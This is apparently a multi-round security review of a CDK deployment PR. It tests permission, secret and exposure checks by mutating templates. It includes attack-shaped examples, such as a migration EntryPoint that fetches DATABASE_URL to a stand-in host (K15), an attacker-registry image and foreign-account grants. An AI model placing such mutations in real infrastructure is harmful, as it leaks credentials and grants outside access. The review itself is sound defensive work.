Verdict: 2 Major

# PF-8b break report: permissions, secrets, public routing (P-303)

PR #2748, branch `claude/cool-bell-2acxlh`, head efeb004 (a later commit, 28bc3e1, appeared during the run; it touches only the workflow, README and estate.test, not `lib/`). Synth only. Ran `npm test` (51/51 pass) and `npm run synth`, then read `cdk.out/xr-{production,staging}.template.json`. I ran no `cdk` command and no AWS CLI. Mutation script: the 17 template mutations below, each run against the real `lib/service-checks.ts` on a copy of the production template (baseline: every check returns `[]`). Template references (`pkg:line`) point at `deploy/cdk/`.

Severity rule: **the shipped template has no Blocker or Major defect.** Both Majors are blind checks. Each one guards a property the row names, and a realistic one-line CDK change gets past it. Those checks are what this PR delivers as proof.

## Major

**M-1. The "no secret value" check misses dynamic references and secret values written into the template** (`lib/service-checks.ts:17`, `:50-51`). The Done-when is "the task definition holds no secret value (only Secrets Manager references)". The checks return `[]` for all of these:
- `secret.secretValue.unsafeUnwrap()` in a container's `environment`. CDK writes it as `{"Fn::Join":["",["{{resolve:secretsmanager:",{"Ref":"xrproductionDatabaseSecret…"},":SecretString:password::}}"]]}`. CloudFormation then resolves it, so the plaintext DB admin password sits in the ECS task definition and anyone with `ecs:DescribeTaskDefinition` can read it. Tried on the migration env (name `ADMIN_PASSWORD`) and on the service env (`PLATFORM_DB_PASSWORD`). `taskSettingFindings` and `roleFindings` both return `[]`.
- `SecretString: "sk_live_51H…"` on `AppSecretPLATFORMSTRIPESECRETKEY…` (that is `secretStringValue: SecretValue.unsafePlainText(…)`). The live key is in the template, the asset bucket and the CloudFormation console. `taskSettingFindings` and `secretReadFindings` return `[]`.
- `PLATFORM_SECRET_BOX_KEYS=1:q2Vn…=` as a plain value in the **migration** task's env. Checks by name cover only the service container, and the `CREDENTIAL` regex has no pattern for base64 keys, BoldSign or Zoom secrets. Returns `[]`.
Fix: flag any `{{resolve:` (also `resolve:ssm-secure`) in any `Environment`, `Command` or `EntryPoint` of every container. Flag any `AWS::SecretsManager::Secret` that has `SecretString` (only `GenerateSecretString` allowed). Apply the secret-name rule to every container of every task definition. Add one fail case for each.

**M-2. The "task role reads no secret; each execution role reads only its own" check misses most ways to grant a read** (`lib/service-checks.ts:57-79`). It only scans `AWS::IAM::Policy`, matches only the actions `secretsmanager:GetSecretValue`, `secretsmanager:*` or `"*"`, and the "another policy" rule only fires when the document text contains `AppSecret`. Each of these returns `[]`:
- task role `ManagedPolicyArns: ["arn:aws:iam::aws:policy/SecretsManagerReadWrite"]` (`taskRole.addManagedPolicy`);
- task role's default policy with `Action: "secretsmanager:Get*", Resource: "*"`;
- task role inline `Role.Properties.Policies` reading `AppSecretDATABASEOWNERURL…` (the owner's address);
- the custom-resource Lambda role (`CustomVpcRestrictDefaultSG…Role`) reading `arn:aws:secretsmanager:ca-central-1:*:secret:xr/production/*`;
- an `AWS::SecretsManager::ResourcePolicy` on the owner secret granting the account root;
- a key-policy statement giving the task role `kms:Decrypt` with no `kms:ViaService`. The key also encrypts the database, the three buckets and ECR, so this is the widest grant possible, and no check reads `KeyPolicy` at all.
Fix: collect statements from `AWS::IAM::Policy`, `AWS::IAM::ManagedPolicy`, `Role.Policies` and `Role.ManagedPolicyArns` (deny AWS-managed policies that include secretsmanager). Match actions with a glob (`secretsmanager:Get*`, `secretsmanager:*`, `*`, `NotAction`). Treat any `Resource` that is `*` or matches `secret:xr/<stage>/*` as a read. Refuse `SecretsManager::ResourcePolicy` resources. Assert that only the two execution roles appear in non-root key-policy statements, and only with `kms:ViaService = secretsmanager.ca-central-1`.

## Minor

1. **No check covers public exposure.** With `AssignPublicIp: "ENABLED"`, the service moved to the public subnets and `ServiceSg` opened to `0.0.0.0/0:8080`, `spreadFindings` and `listenerFindings` return `[]`. With `DatabaseSecurityGroup` ingress `0.0.0.0/0:5432`, every check returns `[]`. The shipped template is right today: tasks get `AssignPublicIp: DISABLED` in the app subnets; the DB allows ingress only from `AppServiceSg` and `AppMigrateSg`; `LbSg` egress goes only to the tasks on 8080. Fix: add `exposureFindings` (no public IP; ingress only via security-group peers, except the LB's 443/80; DB ingress only from the two task security groups).
2. **Cognito checks are incomplete** (`lib/service-checks.ts:158-170`). Setting `AllowAdminCreateUserOnly: false` (self sign-up) on both staff pools returns `[]`. Pointing the service's `PLATFORM_COGNITO_USER_POOL_ID`/`CLIENT_ID` at the **clients** pool (MFA optional) also returns `[]`. Fix: assert admin-only creation on all three pools, and assert the service env refs the `-staff` pool and its client.
3. **The three app clients use CDK's default OAuth settings** (`lib/service.ts:109`). The template has `AllowedOAuthFlows: ["implicit","code"]`, `CallbackURLs: ["https://example.com"]` and scope `aws.cognito.signin.user.admin`. There is no `UserPoolDomain`, so nothing can reach it today. But once PF-4b adds a hosted domain, implicit-flow tokens would go to a host we do not own. Fix: `oAuth: { flows: { authorizationCodeGrant: true }, callbackUrls: [https://*.<domain>/…] }` or `disableOAuth: true` until then.
4. **The HTTPS listener forwards every Host header** (`lib/service.ts:181`). That includes the raw `*.elb.amazonaws.com` name and any spoofed Host. `api/src/platform/web-address/host.ts:67` resolves the firm from `req.headers.host`, which works, but the app still sees attacker-chosen hosts (link building, cache keys). Fix: a fixed-response 404 as the default action, plus a `host-header` rule `*.<domain>` that forwards.
5. **Staging delegation is a manual step, and "staging" is a firm address anyone can take.** The production zone has no NS record for `staging.` (README:39 makes it manual). Until someone adds it, the production wildcard `*.expatready.com.` answers `staging.expatready.com`, which then reaches the **production** ALB under a valid cert. `RESERVED_ADDRESSES` (`api/src/platform/web-address/rules.ts:11`) does not include `staging`, so a production firm can pick the address the staging zone takes over. Fix: add an NS record for `staging` in the production zone (from a parameter) and add `staging` to the reserved list (app side, outside this row; noted for PF-25).
6. **The DMARC record sends no reports** (`lib/service.ts:149`). It reads `v=DMARC1; p=none; adkim=s; aspf=r`, with no `rua=`. The stated intent is "monitor first", but nothing gets monitored. Until the policy changes, anyone can send mail as `@expatready.com` and as firm subdomains. Alignment itself is correct: DKIM `d=` is the apex and strict, SPF on `mail.<domain>` is relaxed, so it aligns. Fix: add `rua=mailto:…` (the founder's address) and plan `p=quarantine`.
7. **`mailFindings` accepts any SPF or DMARC text.** `"v=spf1 +all"` returns `[]` (`lib/service-checks.ts:152`). Fix: require `include:amazonses.com` and a `-all`/`~all` ending.
8. **`listenerFindings` accepts a redirect to any host.** A port-80 redirect with `RedirectConfig.Host: "evil.example.net"` (an open redirect) returns `[]` (`lib/service-checks.ts:125`). Fix: also require `Host` to be absent or `#{host}`.
9. **Egress and keys are broad.** `ServiceSg`, `MigrateSg` and `DatabaseSecurityGroup` allow all outbound to `0.0.0.0/0`. The tasks need 443 out (Stripe, Zoom, BoldSign, SES) and 5432 to the DB; the DB needs nothing. One KMS key covers secrets, RDS, S3 and ECR, so disabling the key or a broad future grant affects all of them. There are no CAA records for the zone that issues the wildcard cert. Suggest restricting egress, using a separate secrets key, and adding a CAA `amazon.com` record.

## What held
- No secret value appears in either template or in any output. All 10 service values plus `DATABASE_OWNER_URL` are `GenerateSecretString` placeholders, with `KmsKeyId` set to the stack key. The only `{{resolve:}}` is RDS `MasterUserPassword` (PF-8a, never exposed). The outputs are the migration security group, subnets and name servers.
- Execution-role policies list exactly their own secret refs: the service has 9, the migration task has only `DATABASE_OWNER_URL`. Neither reads the RDS admin secret. Task roles hold no secretsmanager or kms grant (the service task role has only `ses:SendEmail/SendRawEmail` on its identity). The key policy's non-root statement gives the two execution roles `kms:Decrypt` only through `secretsmanager.ca-central-1`, so they cannot decrypt the DB, bucket or ECR data directly.
- The flag-added custom-resource Lambda role is limited to authorise/revoke on the VPC default security group, plus basic logging. It is not in the VPC and reads no secret.
- Listeners: HTTPS 443 with `ELBSecurityPolicy-TLS13-1-2-2021-06` and the wildcard cert. Port 80 does only `redirect` to HTTPS, HTTP_301. `drop_invalid_header_fields` is on. The LB security group is IPv4 443/80 in, egress only to the tasks on 8080.
- The service runs 2 tasks in two app subnets with no public IP. ECS Exec is off. The DB is in isolated subnets, `PubliclyAccessible: false`, `rds.force_ssl=1`.
- Cognito: three separate pools per stage, all `AllowAdminCreateUserOnly: true`. Both staff pools have `MfaConfiguration: ON` (TOTP only, no SMS). Clients are `OPTIONAL` (documented). Each pool has one public client (SRP only, `PreventUserExistenceErrors`), and deletion protection is on.
- Mail: DKIM on with 3 CNAMEs. SPF `include:amazonses.com ~all` sits on `mail.<domain>`, never on the apex. Staging has its own zone, identity and DMARC. The wildcard does not hide the `mail.` record, which has no A record, and `mail` is a reserved firm address.
- `cdk synth` needs no keys (test proves it). The image is pinned by digest (`^sha256:[a-f0-9]{64}$`), and ECR tags are immutable.

## Re-break (afb1f3c)

Verdict: 2 Major

I read only `git diff efeb004..afb1f3c`. `npm test` passes (54/54); I re-ran `npm run synth` and no `cdk` or AWS CLI. I wrote 35 template mutations against the new checks (all nine check functions, production template; baseline `[]`): the original 17, re-keyed to the new logical ids, and 18 new attempts against `secretReadFindings`, `exposureFindings` and the KMS rule. **All 17 originals are now caught.** So are the reported M-1 and M-2 cases, Minors 1, 2, 3, 7 and 8, and the OAuth default (it is now `disableOAuth`, and a fail case covers it). The template itself is still clean. 18 of the new mutations get through, and these are the two Majors among them.

**RM-1. A dynamic reference anywhere in a task definition except `Environment` is still missed** (`service-checks.ts:67`). That line skips task definitions with the comment "already read above", but the only part read above is `Environment`. These both return `[]`:
- N1: the migration container's `Command` with `"--password", {"Fn::Join":["",["{{resolve:secretsmanager:",{"Ref":"xrproductionDatabaseSecret…"},":SecretString:password::}}"]]}` appended. The command still contains `"migrate","deploy"`, so the migration task is still found.
- N2: the service container's `LogConfiguration.Options` with `{"splunk-token": <same reference>}`. PF-23c's log routing is a likely place for an `unsafeUnwrap()` token.
Either way the plaintext ends up in the task definition, which is exactly what the Done-when forbids. Fix: run the `{{resolve:(secretsmanager|ssm-secure):` test on `json(td)` for every task definition, not only on environment values.

**RM-2. `secretReadFindings` still misses grants made to IAM users** (`:87-88` read only `Roles`). N6 is `secret.grantRead(iam.User.fromUserName(this, "U", "ci-deployer"))`. I rendered it with this package's CDK: it produces `AWS::IAM::Policy {Users:["ci-deployer"], Action:["secretsmanager:DescribeSecret","secretsmanager:GetSecretValue"]}`, and every check returns `[]`. A one-line grant that a secrets-seeding runbook could well add gets past the claim "no principal else may read any secret, whatever form the grant takes". Two more paths are missed:
- N8: the execution role's trust policy gains the account root as a principal, so anyone allowed to assume it reads all ten service secrets, the owner's address included. No check reads `AssumeRolePolicyDocument`.
- N7: `AWS::IAM::RolePolicy` (the L1 resource type) is not scanned.
Fix: treat any `Users` or `Groups` on a policy as a finding. Allow only `ecs-tasks.amazonaws.com` in the two execution roles' trust policies. Scan `AWS::IAM::RolePolicy`, `UserPolicy` and `GroupPolicy` as well.

**Minor (new):**
- N4 and N5: an `Allow` with `NotAction: ["iam:*"]`, or the action `secretsmanager:*SecretValue`, gets past `readsSecret` (`:20`). Fix: refuse any `NotAction` and match actions as globs.
- KMS rule (`:21`, `:108-112`). Each of these returns `[]`:
  - N9: a hand-written principal `{"AWS":{"Fn::Join":["",["arn:",{"Ref":"AWS::Partition"},":iam::999999999999:root"]]}}` passes as "root". The first `ROOT` alternative is only a prefix test, followed by `.includes(":root")`. CDK's own `AccountPrincipal("999…")` renders as a plain string and *is* caught.
  - N10: `Principal: {"AWS":"*"}` passes as long as the condition mentions `kms:ViaService` with any value (`StringLike "*"`).
  - N11 and N12: `kms:CreateGrant` (which lets a principal grant itself Decrypt) and `kms:Dec*` are not matched.
  Fix: root means this account only (`AWS::AccountId` and `:root`, anchored). Require `StringEquals kms:ViaService = secretsmanager.ca-central-1.amazonaws.com` exactly. Count `CreateGrant` and `ReEncrypt*` with Decrypt, and match actions as globs.
- `exposureFindings` (`:127`) checks only internet ranges, not who can reach the database:
  - N14: DB ingress from the VPC CIDR (`connections.allowDefaultPortFrom(Peer.ipv4(vpc.vpcCidrBlock))`, a common pattern) is not flagged.
  - N15: DB ingress from the load balancer's security group is not flagged.
  - N13 and N17: `0.0.0.0/1` plus `128.0.0.0/1`, or a `SourcePrefixListId`, on the task security group are not flagged.
  - N16: `PubliclyAccessible: true` is not flagged. It has no effect today because the subnets are isolated.
  Fix: DB ingress only from `ServiceSg` and `MigrateSg`; task ingress only from the LB's security group; any non-security-group source is a finding unless it is the LB on 80/443.
- N3 and N18: `CREDENTIAL` runs only on task definitions. `sk_live_…` in the custom-resource Lambda's `Environment.Variables` gets through. So does a `{{resolve:` that a hand-written `Fn::Join` splits into the parts `"{{resolve:","secretsmanager:"`.

**The service now holds the owner's address** (`DATABASE_URL` = `xr/<stage>/DATABASE_OWNER_URL`, because pg-boss needs it). The service execution role reads that secret, and the running process holds DDL rights. This contradicts the row ("the service runs as the app role"), and the deviation is escalated correctly in `challenge.md`, so I do not count it here. My read: option 2 (an `xr_jobs` role) is what removes the owner credential from the internet-facing process, and it should not wait long. `roleFindings` holds: the owner secret under `APP_DATABASE_URL` or any other name is caught, and so are the RDS admin secret and the app role's secret in the migration task.

**Still open as you noted (unchanged):** Minor 4 (Host header), 5 (staging delegation and the reserved address), 6 (DMARC `rua`) and 9 (egress, one key, CAA).

## Re-break (bd5a1ce)

Verdict: no Major

I read only `git diff afb1f3c..bd5a1ce`, leaving out `product/screens`. `npm test` passes (54/54); I re-ran `npm run synth` and no `cdk` or AWS CLI. I ran 46 mutations against all nine checks on the production template (baseline `[]`): O1–O16, N1–N18, and 11 new ones (R1–R11).

**Closed:**
- RM-1. N1 (`Command`) and N2 (`LogConfiguration.Options`) are now caught. So are R10 (a sidecar container's env) and R11 (a dynamic reference in `Volumes`).
- RM-2. These are all caught now: N6 (`User.fromUserName` grant), N7 (`RolePolicy`), N8 (execution-role trust widened), N4 (`NotAction`) and N5 (`secretsmanager:*SecretValue`).
- The KMS rule. Caught: N9 (another account's root behind `AWS::Partition`), N10 (`*` with a `StringLike *` ViaService), N11 (`CreateGrant`), N12 (`kms:Dec*`), R5 (ViaService list including s3) and R8 (another account through `Fn::Sub`).
- Every earlier case O1–O16 is still caught.

**Still missed, all Minor.** None comes from a CDK grant method; each needs a hand-written L1 resource.
- **R3 and R4: the ViaService rule reads only the text, not the condition operator** (`service-checks.ts:121`). These both return `[]`:
  - `Principal {"AWS":"*"}` with `StringNotEquals {"kms:ViaService":"secretsmanager.ca-central-1.amazonaws.com"}`, which means "any direct call";
  - the task role with `StringEqualsIfExists` on the same value. A direct `kms:Decrypt` call carries no ViaService key, so it passes.
  Fix: accept only `StringEquals` (or `ForAllValues:StringEquals` with that single value). Treat any other operator on `kms:ViaService` as a missing condition.
- **R1 and R7: a `Statement` written as one object instead of an array is skipped.** IAM and KMS both accept that form; `arr()` turns it into `[]`. This gets through for a role policy with `GetSecretValue` on `*`, and even for a key policy of `kms:*` to `Principal *`. Fix: wrap a single object in an array before reading.
- **R2: an `Action` built from an intrinsic** (`Fn::Join` → `secretsmanager:GetSecretValue`) is skipped, because only plain strings are read. Fix: treat a non-string action as a finding.
- **R6: `kms:ReEncrypt*` granted to another account with no ViaService is not counted.** It moves this key's ciphertext under a key that account owns. Fix: add `kms:ReEncryptFrom` to `decrypts`.
- **R9: `iam:PassRole` on an execution role, granted to the task role, is not flagged.** Together with `ecs:RunTask` and `ecs:RegisterTaskDefinition`, the running app could start a task that reads every service secret. Fix: flag any grant of `iam:PassRole` on an execution role.
- **Unchanged from the last round:**
  - N3: `sk_live_…` in a Lambda's environment; the credential scan covers task definitions only.
  - N18: a `{{resolve:` split across `Fn::Join` parts.
  - N13 to N17: the database's and the tasks' allowed sources (VPC range, the LB's security group, `/1` halves, a prefix list, `PubliclyAccessible`). Left Minor by choice.

**Holds:** the trust check compares the whole trust document exactly, so nothing else can be added to it. The managed-policy allow list matches only `arn:…:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole`, so a policy of the same name in our own account does not pass. Users, groups, and `UserPolicy`/`GroupPolicy` grants all count as non-execution holders. The template is unchanged apart from the shorter header comment.

## Re-break (adaa846)

Verdict: 2 Major

I read only `git diff b01a20d adaa846 -- …/deploy/cdk/lib/checks.ts`. `npm test` passes (83/83); I re-ran `npm run synth` and no `cdk` or AWS CLI. I wrote 42 mutations on `xr-production` inside the real `allStacks(buildApp())`, each run through `regionFindings(…, REGION_ALLOW)`, `bypassFindings`, `resourcePolicyFindings`, `typeFindings` and all nine `service-checks` functions. The baseline is 0 findings.

**Majors.** Both come from `ESTATE_TYPES` (`checks.ts:397`) admitting resource types whose own permission fields no check reads.
- **RB-1. A task definition can run under any role from outside the stack.** I1: setting the service's `TaskRoleArn` to `{"Fn::Join":["",["arn:aws:iam::",{"Ref":"AWS::AccountId"},":role/OrganizationAccountAccessRole"]]}` passes every check (`taskRole: iam.Role.fromRoleArn(…)` renders it that way). PF-8rc refuses a policy "attached to a role named from outside" (`:379`). With `AWS::ECS::TaskDefinition` admitted, the internet-facing app can simply use such a role, admin included, and none of the role, action or secret guards ever sees it. (I1b, an outside `ExecutionRoleArn`, is caught, but only because the secrets lose their reader.) Fix: in `bypassFindings`, both `TaskRoleArn` and `ExecutionRoleArn` must be `Fn::GetAtt [<an AWS::IAM::Role of this stack>, Arn]`.
- **RB-2. The ECR repository's resource policy is not read.** I2: `RepositoryPolicyText` allowing `Principal:"*"` to `ecr:BatchGetImage`, and account `999999999999` to `ecr:PutImage`/`UploadLayerPart`, passes every check. That is a public pull of the app image plus a foreign push into the production repository; with `repository.grantPull(new AnyPrincipal())` or `grantPullPush(new AccountPrincipal(…))` it is a one-liner. `resourcePolicyFindings` (`:262`) still reads only KMS keys, vaults and bucket policies, so PF-8rc's rule "every Allow names this account's root" stops at the new type. Fix: add `AWS::ECR::Repository` (`RepositoryPolicyText`) to `resourcePolicyFindings`, allowing nothing but root (or, simpler, refuse the property).

**Minor**
- **Trust by two services through two statements** (`trusted()`, `:339`, reads only the first Allow statement). This guard is a role trusted by both services. A2c: a new role trusted by `[{Service:ecs-tasks},{Service:backup}]` holding `ecr:BatchGetImage` and `ses:SendRawEmail` passes. A3: the task role's trust widened the same way also passes. (A4 on the execution role is caught by `service-checks`' exact-trust rule; A2 on the Backup role is caught only because its existing `kms:Decrypt` is not on the ECS list.) Fix: every Allow statement must name exactly one listed service, and only one statement is allowed.
- **Joined ARNs:** `own()` (`:368`) refuses `*` but not `?`, and does not check the account in literal parts.
  - E1: `arn:aws:ecr:ca-central-1:999999999999:repository/` + `{Ref:Images}` passes.
  - E5: account `????????????` (any account) passes.
  - E4: a `??????????` suffix passes.
  - A secret ARN built this way is still caught by `secretReadFindings` (an exact compare), and the image is pinned to our own repository by test, so these are Minor.
  Fix: in a joined ARN the account part must be `{Ref: AWS::AccountId}`, and no literal may contain `?`.
- **Key policy, `ecsExec`** (`:273`):
  - G5: a Principal of `{AWS: <exec role>, Service: "backup.amazonaws.com"}` passes, because keys other than `AWS` are ignored.
  - G6: a Backup role whose trust has a **Deny** statement naming ecs-tasks passes the `.includes(…ecs-tasks…)` test. Harmless, since that role has no secrets read.
  - G1: SM-only decrypt for the task role passes. Harmless, because the task role has no secrets read.
  Fix: require `Object.keys(Principal) == ["AWS"]` and read the trust through `allows()`.
- **Other admitted types with outside references that nothing reads:**
  - I3: the staff pool's `LambdaConfig.PreTokenGeneration` pointing at an outside Lambda, which could add claims to staff tokens;
  - I4: `SmsConfiguration.SnsCallerArn` naming an outside role;
  - I5: the HTTPS listener forwarding to a foreign target group ARN (CloudFormation would likely refuse it);
  - I6: database ingress from `SourceSecurityGroupOwnerId: 999999999999`, which belongs with the database's allowed sources, Minor by choice.

**Held**
- A Backup role gaining ECS actions (A1, A2b, D2), and an ECS role with `iam:*`, `iam:PassRole`, `sts:AssumeRole`, `kms:*` or `secretsmanager:PutSecretValue` (B×5): action lists are matched exactly.
- An ECS principal plus an AWS principal, in one statement or two (A5, A6).
- `*` riding along with `GetAuthorizationToken` (D1).
- A joined ARN naming another region (E2), or using the digest parameter (E3).
- Every digest-parameter variant: a `Default` (F1), `AllowedValues` (F2), a region in `Description` (F3), a widened pattern (F4). Each one fails `digestOnly` or the region scan of the `Parameters` section.
- Key policy: a grant with no ViaService (G2), with ViaService widened to s3 (G3), or with `kms:*` (G4) is refused.
- `Policies` on a non-IAM type: a SAM function is refused by `typeFindings` (H1). A `Statement` inside Cognito's `Policies` (H2) passes the checks, but CloudFormation's own schema refuses it.

## Re-break (c99d79a)

Verdict: 1 Major

The range `0d0a5b2..c99d79a` did not resolve, so I read `git diff HEAD~1 HEAD` (c99d79a), leaving out `product/screens`. `npm test` passes (83/83); I re-ran `npm run synth` and no `cdk` or AWS CLI. I re-ran the round-4 set (40 cases, including A2c and B×5) through all four `checks.ts` guards and the nine `service-checks` functions. 36 are caught now, RB-1 (I1, I1b) and RB-2 (I2, I3, I4) among them, along with trust read across every statement (A2c, A3), separate execution and task action lists, `?` and account numbers in joined ARNs (E1, E4, E5), and execution-role-only key grants with a single principal key (G1, G5, G6). The 4 still missed are H2 (CloudFormation's schema refuses it) and I5, I6, I7 (Minor, as listed before). I added 10 new attempts, J1–J10.

**RC-1 (Major). No check reads where any image other than the service's main container comes from.** J1: setting the **migration** container's `Image` to `docker.io/attacker/tools@sha256:bbbb…` returns 0 findings across every function. That container holds `DATABASE_URL` = `xr/<stage>/DATABASE_OWNER_URL`, the table owner, and PF-8c runs it automatically before every deploy. So one `ContainerImage.fromRegistry(…)` hands the owner credential to an outside image.
- J1b: a sidecar on the service task pulled from docker.io also passes.
- J2: a third task definition passes too. It has its own ecs-trusted execution role (trust written in CDK's key order), reads the owner secret, gets an SM-only key grant, and runs a docker.io image. It is never run by the service, but `roleFindings` looks only at the first task definition whose command contains `migrate deploy` (`service-checks.ts:33`). The only image check is a **test** on the service's first container (`test/service.test.ts:44`).
The row says the image is PF-7's, by digest, and that migrations run under the owner role. This is the permission path that matters most, and nothing guards it. Fix: a check in `service-checks.ts` (not only a test) that every container `Image` in every task definition is exactly this stack's repository URI `@{Ref: <digest parameter>}`. Allow exactly two task definitions: the service's and the migration task.

**Minor**
- J3 and J4: the account test in joined ARNs (`checks.ts:383`, `:\d{12}:`) misses an account split across two literals (`"…:999999"`, `"999999:repository/"`) and an account that ends a literal (`"…:999999999999"`, `":repository/"`). Fix: test the joined literal text.
- J6: an outside ARN in the ECS service's `Role` passes. The key is `Role`, so the `RoleArn$` pattern (`:364`) misses it.
- J5: bucket `NotificationConfiguration.LambdaConfigurations` naming a foreign Lambda passes. Only `LambdaConfig` is refused, and the notification sends object keys, not object contents.
- J9: the staff pool's `EmailConfiguration.SourceArn` set to a foreign SES identity passes. That is where invitations and reset codes are sent from.
- J10: load balancer access logs sent to a bucket we don't own (`access_logs.s3.bucket`) pass, which would leak request metadata.
- I5, I6 and I7 are unchanged.

**Held:** every round-4 mutation except the four above. J8 is held too: a dummy task definition that makes the task role an "execution role" so the key grant passes is still caught, because the task role then falls into both lists and gets no actions.

## Re-break (round 6)

Verdict: no Major

I read `git diff HEAD~1 HEAD` (23ef8fb), leaving out `product/screens`. `npm test` passes (83/83). I used no `cdk` command and no AWS CLI.

**The five fields turned into locals change nothing.** I synthesized HEAD~1's `service.ts` and HEAD's in two scratch copies of `deploy/cdk` (the same `lib/`, `cdk.json` and `node_modules`, `node bin/app.ts`). All four templates (`xr-staging`, `xr-production` and both `-copy` stacks) are byte-identical. No file in `lib/` or `test/` reads the removed fields.

**`imageFindings`:** I wrote 17 mutations on `xr-production`, each run through `imageFindings` and every other check (baseline: none). 15 are caught:
- another registry (docker.io, K1);
- a `:latest` tag on our own repository (K2);
- our own URI written as a literal string (K3);
- a sidecar (K4);
- a third task definition, even with the exact image (K5);
- a second repository (K6);
- a second digest parameter, whether its pattern matches (K7) or is open (K8);
- a loosened pattern (K9);
- the parameter switched to an SSM type (K10) or given a `Default` (K11), both caught by PF-8rc's `opaque()`;
- the service running an outside task definition ARN (K12);
- the migration's `ContainerDefinitions` wrapped in `Fn::If` (K13);
- a literal account in place of the ARN part (K14);
- an ECR pull-through cache rule (K16), caught by `typeFindings`.

Missed, both **Minor**:
- **K15:** the migration container with our own image and `EntryPoint: ["node","-e","fetch('https://x.example/'+…process.env.DATABASE_URL)"]` passes every check. Our image pinned by digest still runs inline code that holds the owner credential. That takes a deliberate change, not a slip, which is why I rank it Minor. Fix: in `imageFindings`, require no `EntryPoint` on either container, and `Command` exactly `["./node_modules/.bin/prisma","migrate","deploy"]` on the migration and absent on the service.
- **K17:** a `MUTABLE` tag setting on the repository passes. It has no effect while images are run by digest.
